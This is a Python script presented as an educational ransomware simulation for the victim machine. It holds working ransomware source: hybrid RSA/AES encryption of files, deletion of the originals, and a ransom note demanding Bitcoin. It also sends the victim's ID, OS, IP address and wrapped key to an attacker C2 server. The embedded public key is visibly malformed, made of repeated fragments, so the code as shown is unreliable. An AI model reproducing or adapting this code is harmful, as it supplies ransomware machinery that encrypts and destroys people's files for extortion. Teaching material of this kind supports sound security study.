"""
Ransomware Demo - Victim Side
Run this on Windows VM
"""

import os
import base64
import requests
import socket
import platform
import uuid
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

print("="*60)
print("🔒 RANSOMWARE SIMULATION - VICTIM SIDE")
print("⚠️  FOR EDUCATIONAL USE IN VM ONLY!")
print("="*60)

# Configuration - CHANGE KALI_IP to your attacker IP
KALI_IP = "192.168.1.100"  # ⬅️ CHANGE THIS!
C2_URL = f"http://{KALI_IP}:5000/register"

# Public key (will be replaced by attacker)
PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzK6I5GvJXqLw5R7vT8M8
pG6+J9wM2iY7F3sKq1A4bB5zJm8N6qL3aV2sP7rT4Y6mG9+W3xL8jMkQ5vR2sN6
qL3aV2sP7rT4Y6mG9+W3xL8jMkQ5vR2sN6qL3aV2sP7rT4Y6mG9+W3xL8jMkQ5v
R2sN6qL3aV2sP7rT4Y6mG9+W3xL8jMkQ5vR2sN6qL3aV2sP7rT4Y6mG9+W3xL8j
-----END PUBLIC KEY-----'''

class VictimRansomware:
    def __init__(self):
        self.victim_id = str(uuid.uuid4())[:8]
        self.aes_key = os.urandom(32)
        self.public_key = self.load_public_key()
        print(f"Victim ID: {self.victim_id}")
    
    def load_public_key(self):
        """Load the attacker's public key"""
        return serialization.load_pem_public_key(
            PUBLIC_KEY.encode(),
            backend=default_backend()
        )
    
    def contact_attacker(self):
        """Send encrypted key to attacker's C2 server"""
        # Encrypt AES key with RSA public key
        encrypted_aes = self.public_key.encrypt(
            self.aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # Prepare victim data
        data = {
            'id': self.victim_id,
            'os': platform.platform(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'key': base64.b64encode(encrypted_aes).decode(),
            'files': 0
        }
        
        # Send to attacker
        try:
            response = requests.post(C2_URL, json=data, timeout=5)
            if response.status_code == 200:
                print("[+] Successfully contacted attacker C2")
                return True
        except Exception as e:
            print(f"[-] Could not contact attacker: {e}")
        
        return False
    
    def create_test_files(self):
        """Create demo files to encrypt"""
        test_files = []
        for i in range(5):
            filename = f"my_document_{i+1}.txt"
            with open(filename, 'w') as f:
                f.write(f"This is document #{i+1}\n")
                f.write("Important company data here...\n")
            test_files.append(filename)
            print(f"[+] Created: {filename}")
        return test_files
    
    def encrypt_files(self, filenames):
        """Encrypt files with AES"""
        encrypted_count = 0
        
        for filename in filenames:
            try:
                # Read file
                with open(filename, 'rb') as f:
                    data = f.read()
                
                # Generate random IV
                iv = os.urandom(16)
                
                # Create AES cipher
                cipher = Cipher(algorithms.AES(self.aes_key), modes.CFB(iv))
                encryptor = cipher.encryptor()
                
                # Encrypt data
                encrypted_data = encryptor.update(data) + encryptor.finalize()
                
                # Save encrypted file
                encrypted_name = filename + ".encrypted"
                with open(encrypted_name, 'wb') as f:
                    f.write(iv + encrypted_data)  # IV + encrypted data
                
                # Remove original
                os.remove(filename)
                
                print(f"[✓] Encrypted: {filename}")
                encrypted_count += 1
                
            except Exception as e:
                print(f"[✗] Failed: {filename} - {e}")
        
        return encrypted_count
    
    def create_ransom_note(self):
        """Create instructions for victim"""
        note = f"""
        ╔══════════════════════════════════════════════════════════╗
        ║                 YOUR FILES ARE ENCRYPTED!                ║
        ╚══════════════════════════════════════════════════════════╝
        
        All your important files have been encrypted with military-grade
        AES-256 encryption.
        
        🔑 Your Victim ID: {self.victim_id}
        
        To recover your files:
        1. Contact the attacker with your Victim ID
        2. Pay $1000 in Bitcoin
        3. Receive decryption key
        
        ⚠️ WARNING:
        • Do NOT delete encrypted files
        • Do NOT use recovery software
        • Do NOT restart your computer
        
        ───────────────────────────────────────────────────────────
        This is a simulation for educational purposes only.
        Files are encrypted but can be recovered with decryptor.py
        ───────────────────────────────────────────────────────────
        """
        
        with open("!!!READ_ME!!!.txt", "w") as f:
            f.write(note)
        
        print("[+] Ransom note created: !!!READ_ME!!!.txt")
    
    def run(self):
        """Main execution"""
        print("\n[1/4] Contacting attacker C2 server...")
        self.contact_attacker()
        
        print("\n[2/4] Creating test files...")
        files = self.create_test_files()
        
        print("\n[3/4] Encrypting files...")
        count = self.encrypt_files(files)
        print(f"   → Encrypted {count} files")
        
        print("\n[4/4] Creating ransom note...")
        self.create_ransom_note()
        
        # Securely wipe AES key from memory
        self.aes_key = b'0' * 32
        
        print("\n" + "="*60)
        print("✅ SIMULATION COMPLETE!")
        print(f"📋 Your Victim ID: {self.victim_id}")
        print("📝 Share this ID with attacker to get decryption key")
        print("="*60)
        
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    # Safety check - warn if not in VM
    if platform.system() != "Windows":
        print("⚠️  This is designed for Windows systems!")
    
    print("This will encrypt files in the current directory.")
    print("Make sure you're in a Windows VM!")
    
    confirm = input("\nContinue? (yes/no): ").lower()
    if confirm == 'yes':
        malware = VictimRansomware()
        malware.run()
    else:
        print("Cancelled.")
        